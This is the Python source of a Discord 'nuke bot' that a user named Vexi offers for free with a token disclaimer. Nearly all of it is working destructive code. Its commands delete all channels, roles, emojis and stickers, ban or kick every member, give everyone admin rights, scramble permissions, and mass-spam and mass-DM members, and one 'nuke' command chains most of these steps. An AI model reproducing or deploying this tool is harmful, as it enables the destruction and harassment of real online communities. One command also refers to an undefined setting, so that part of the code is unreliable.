# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by Vexi :3

import discord
from discord.ext import commands
import asyncio
import aiohttp
import io
from datetime import datetime, timedelta
import random

# CONFIG #
class Config:
    # ===== BOT SETTINGS =====
    TOKEN = ""  # Your bot token from Discord Developer Portal
    PREFIX = "."  # The prefix to use before commands (e.g. .nuke)
    WHITELIST = []  # List of user IDs who can use the bot commands

    # ===== MESSAGE SETTINGS =====
    SPAM_MESSAGE = "@everyone"  # The message that will be spammed in channels
    SPAM_COUNT = 10  # How many times to send the spam message in each channel
    TEXT_TO_SPEECH = False  # If true, messages will be read aloud by Discord's text-to-speech
    DM_MESSAGE = "THE SERVER GOT NUKED"  # Message sent to all members via direct message

    # ===== CHANNEL SETTINGS =====
    CHANNEL_NAME = "nuked"  # Base name for created text channels
    CHANNELS_COUNT = 10  # How many text channels to create
    NEW_CHANNEL_NAME = "renamed-nuked"  # Name pattern when renaming existing channels
    VOICE_CHANNELS_COUNT = 10  # How many voice channels to create
    VOICE_CHANNEL_NAME = "NUKED"  # Base name for created voice channels
    CATEGORY_NAME = "NUKED"  # Base name for created categories
    CATEGORIES_COUNT = 5  # How many categories to create
    THREAD_COUNT = 5  # How many threads to create in each text channel
    THREAD_NAME = "nuked"  # Base name for created threads
    NSFW_CHANNEL_NAME = "nuked"  # Base name for NSFW channels
    SLOWMODE_DURATION = 300  # Slowmode duration in seconds for all channels

    # ===== ROLE SETTINGS =====
    ROLE_NAME = "nuked"  # Base name for created roles
    ROLES_COUNT = 10  # How many roles to create
    NEW_ROLE_NAME = "renamed-nuked"  # Name pattern when renaming existing roles
    ADMIN_ROLE_NAME = "ADMIN"  # Name of the admin role given to everyone

    # ===== SERVER SETTINGS =====
    SERVER_NAME = "NUKED SERVER"  # New name for the server
    SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"  # URL of new server icon
    NICKNAME = "NUKED_LOSER"  # New nickname for all members
    TIMEOUT_DURATION = 28  # Timeout duration in days for all members, anything above 28 will not work

    # ===== WEBHOOK SETTINGS =====
    WEBHOOK_NAME = "NUKED_WEBHOOK"  # Base name for created webhooks
    WEBHOOK_COUNT = 10  # How many webhooks to create per channel
    WEBHOOK_RENAME = "RENAMED_NUKED_WEBHOOK"  # Name pattern when renaming webhooks

    # ===== INVITE SETTINGS =====
    INVITE_COUNT = 10  # How many invite links to create per channel

    # ===== PIN SETTINGS =====
    PIN_SPAM_COUNT = 5  # How many random messages to pin in each channel

    # ===== VOICE SETTINGS =====
    MOVE_VOICE_CHANNEL_NAME = "LOSERS"  # Name of voice channel to moves everyone to

    # ===== PERMISSION SETTINGS =====
    CHAOS_PERMISSIONS = [True, False, None]  # Random permission states for chaos commands, do not change if you dont know what your doing


# ===== MAIN CODE, ONLY CHANGE IF YOU KNOW WHAT YOUR DOING. =====
config = Config()
bot = commands.Bot(command_prefix=config.PREFIX, intents=discord.Intents.all())
bot.remove_command("help")

def is_whitelisted(ctx):
    return ctx.author.id in config.WHITELIST

async def download_image(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.read()
                return None
    except:
        return None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.event
async def on_command(ctx):
    if is_whitelisted(ctx):
        await asyncio.sleep(0.1)
        try:
            await ctx.message.delete()
        except:
            pass

@bot.check
async def globally_check_dm(ctx):
    return ctx.guild is not None

@bot.command()
async def rserver(ctx):
    if not is_whitelisted(ctx): return
    await ctx.guild.edit(name=config.SERVER_NAME)

@bot.command()
async def rservericon(ctx):
    if not is_whitelisted(ctx): return
    icon_image = await download_image(config.SERVER_ICON_URL)
    if icon_image:
        await ctx.guild.edit(icon=icon_image)

@bot.command()
async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}")
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}-{i}")
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for i in range(count):
        try:
            await ctx.guild.create_category_channel(f"{config.CATEGORY_NAME}-{i}")
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def cthread(ctx, count: int = config.THREAD_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for channel in ctx.guild.text_channels:
        for i in range(count):
            try:
                await channel.create_thread(name=f"{config.THREAD_NAME}-{i}", auto_archive_duration=60)
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            channel = await ctx.guild.create_text_channel(f"{config.NSFW_CHANNEL_NAME}-{i}")
            await channel.edit(nsfw=True)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def dchannels(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except:
            pass
    try:
        await ctx.guild.create_text_channel(config.CHANNEL_NAME)
    except:
        pass

@bot.command()
async def dcategory(ctx):
    if not is_whitelisted(ctx): return
    for category in ctx.guild.categories:
        try:
            await category.delete()
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def rchannels(ctx):
    if not is_whitelisted(ctx): return
    for i, channel in enumerate(ctx.guild.channels):
        try:
            await channel.edit(name=f"{config.NEW_CHANNEL_NAME}-{i}")
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def nsfwall(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(nsfw=True)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def rtopics(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(topic=random.choice(config.TOPICS))
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
    if not is_whitelisted(ctx): return
    seconds = max(0, min(seconds, 21600))
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(slowmode_delay=seconds)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def croles(ctx, count: int = config.ROLES_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}")
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def droles(ctx):
    if not is_whitelisted(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def rroles(ctx):
    if not is_whitelisted(ctx): return
    i = 0
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.edit(name=f"{config.NEW_ROLE_NAME}-{i}")
                i += 1
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def adminall(ctx):
    if not is_whitelisted(ctx): return
    try:
        admin_role = await ctx.guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
        for member in ctx.guild.members:
            try:
                await member.add_roles(admin_role)
                await asyncio.sleep(0.5)
            except:
                pass
    except:
        pass

@bot.command()
async def rnickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            await member.edit(nick=config.NICKNAME)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def demoteall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
            if roles_to_remove:
                await member.remove_roles(*roles_to_remove)
                await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def moveall(ctx):
    if not is_whitelisted(ctx): return
    try:
        vc = await ctx.guild.create_voice_channel(config.MOVE_VOICE_CHANNEL_NAME)
        for member in ctx.guild.members:
            if member.voice:
                try:
                    await member.move_to(vc)
                    await asyncio.sleep(0.5)
                except:
                    pass
    except:
        pass

@bot.command()
async def disconnectall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member.voice:
            try:
                await member.move_to(None)
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def banall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban()
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def unbanall(ctx):
    if not is_whitelisted(ctx): return
    async for entry in ctx.guild.bans():
        try:
            await ctx.guild.unban(entry.user)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def kickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.kick()
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def timeoutall(ctx):
    if not is_whitelisted(ctx): return
    duration = min(config.TIMEOUT_DURATION, 28)
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.timeout(timedelta(days=duration))
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def untimeoutall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            await member.timeout(None)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def spam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for _ in range(count):
        try:
            await ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def mspam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 20))
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def purge(ctx):
    if not is_whitelisted(ctx): return
    try:
        await ctx.channel.purge(limit=None)
    except:
        pass

@bot.command()
async def mpurge(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            await channel.purge(limit=None)
            await asyncio.sleep(1)
        except:
            pass

@bot.command()
async def rpins(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            pins = await channel.pins()
            for message in pins:
                try:
                    await message.unpin()
                    await asyncio.sleep(0.5)
                except:
                    pass
        except:
            pass

@bot.command()
async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for i in range(count):
        try:
            await ctx.channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}")
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 5))
    for channel in ctx.guild.text_channels:
        for i in range(count):
            try:
                await channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{i}")
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def dwebhooks(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete()
                    await asyncio.sleep(0.5)
                except:
                    pass
        except:
            pass

@bot.command()
async def rwebhooks(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for i, webhook in enumerate(webhooks):
                try:
                    await webhook.edit(name=f"{config.WEBHOOK_RENAME}-{i}")
                    await asyncio.sleep(0.5)
                except:
                    pass
        except:
            pass

@bot.command()
async def cinvites(ctx, count: int = config.INVITE_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 10))
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await channel.create_invite()
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def dinvites(ctx):
    if not is_whitelisted(ctx): return
    invites = await ctx.guild.invites()
    for invite in invites:
        try:
            await invite.delete()
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def demojis(ctx):
    if not is_whitelisted(ctx): return
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def dstickers(ctx):
    if not is_whitelisted(ctx): return
    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def dmall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != bot.user:
            try:
                await member.send(config.DM_MESSAGE)
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def chaoschannels(ctx):
    if not is_whitelisted(ctx): return
    channels = list(ctx.guild.channels)
    random.shuffle(channels)
    for position, channel in enumerate(channels):
        try:
            await channel.edit(position=position)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def chaosroles(ctx):
    if not is_whitelisted(ctx): return
    roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
    random.shuffle(roles)
    for position, role in enumerate(roles, start=1):
        try:
            await role.edit(position=position)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def chaoschannelperms(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        for role in ctx.guild.roles:
            try:
                perms = discord.PermissionOverwrite()
                perms.send_messages = random.choice(config.CHAOS_PERMISSIONS)
                perms.view_channel = random.choice(config.CHAOS_PERMISSIONS)
                perms.manage_messages = random.choice(config.CHAOS_PERMISSIONS)
                await channel.set_permissions(role, overwrite=perms)
                await asyncio.sleep(0.1)
            except:
                pass

@bot.command()
async def chaosroleperms(ctx):
    if not is_whitelisted(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                perms = discord.Permissions()
                perms.value = random.randint(0, 2147483647)
                await role.edit(permissions=perms)
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def lockdown(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def unlockall(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=None)
            await asyncio.sleep(0.5)
        except:
            pass

@bot.command()
async def nuke(ctx):
    if not is_whitelisted(ctx): return
    try:
        await ctx.message.delete()
    except:
        pass
    
    try:
        await ctx.guild.edit(name=config.SERVER_NAME)
    except:
        pass
    
    if config.SERVER_ICON_URL:
        icon_image = await download_image(config.SERVER_ICON_URL)
        if icon_image:
            try:
                await ctx.guild.edit(icon=icon_image)
            except:
                pass
    
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except:
            pass
    
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0.5)
            except:
                pass
    
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.5)
        except:
            pass
    
    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(0.5)
        except:
            pass
    
    try:
        main_channel = await ctx.guild.create_text_channel(config.CHANNEL_NAME, topic="Nuked")
    except:
        main_channel = None
    
    for i in range(config.CHANNELS_COUNT):
        try:
            await ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}", topic=f"Channel {i}")
            await asyncio.sleep(0.5)
        except:
            pass
    
    for i in range(config.ROLES_COUNT):
        try:
            await ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}")
            await asyncio.sleep(0.5)
        except:
            pass
    
    for member in ctx.guild.members:
        if member == bot.user:
            continue
        try:
            if config.NICKNAME:
                await member.edit(nick=config.NICKNAME)
        except:
            pass
        try:
            if config.DM_MESSAGE:
                await member.send(config.DM_MESSAGE)
                await asyncio.sleep(0.5)
        except:
            pass
    
    for channel in ctx.guild.text_channels:
        for _ in range(config.SPAM_COUNT):
            try:
                await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
                await asyncio.sleep(0.5)
            except:
                pass

@bot.command()
async def whitelist(ctx):
    if not is_whitelisted(ctx): return
    message = "Whitelisted Users:\n" + "\n".join(str(user_id) for user_id in config.WHITELIST)
    try:
        await ctx.author.send(message)
    except:
        pass

@bot.command()
async def kill(ctx):
    if not is_whitelisted(ctx): return
    await ctx.send("Bot shutting down...")
    await bot.close()

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(
        title="🖥️ Commands",
        description="List of available bot commands.",
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )

    categories = {
        "🔨 Moderation": [
            "`banall`",
            "`unbanall`",
            "`kickall`",
            "`timeoutall`",
            "`untimeoutall`",
            "`rnickall`",
        ],
        "📁 Channels": [
            "`ccategory`",
            "`cchannels`",
            "`chaoschannels`",
            "`chaoschannelperms`",
            "`dcategory`",
            "`dchannels`",
            "`rchannels`",
            "`cthread`",
            "`cvoice`",
            "`slowmodeall`",
            "`lockdown`",
            "`unlockall`",
            "`moveall`",
            "`disconnectall`",
            "`rtopics`",
        ],
        "🎭 Roles": [
            "`adminall`",
            "`croles`",
            "`chaosroles`",
            "`chaosroleperms`",
            "`droles`",
            "`rroles`",
            "`demoteall`",
        ],
        "🔗 Invites / Webhooks": [
            "`cinvites`",
            "`dinvites`",
            "`cwebhooks`",
            "`dwebhooks`",
            "`mwebhooks`",
            "`rwebhooks`",
        ],
        "🖼️ Server": [
            "`rserver`",
            "`rservericon`",
            "`rpins`",
            "`cnsfw`",
            "`nsfwall`",
            "`demojis`",
            "`dstickers`",
        ],
        "💬 Messages": [
            "`purge`",
            "`mpurge`",
            "`mspam`",
            "`spam`",
            "`dmall`",
        ],
        "💥 Destructive": [
            "`nuke`",
        ],
        "🧩 Bot": [
            "`kill`",
            "`whitelist`",
        ],
        "\u200b": [
            "-# Thanks to [Vexi](<https://discord.com/users/1421939463164133590>), this product is brought to you for free! 🎀"
        ]
    }

    for category, commands in categories.items():
        embed.add_field(
            name=category,
            value="\n".join(commands),
            inline=False
        )

    await ctx.send(embed=embed)

bot.run(config.TOKEN)
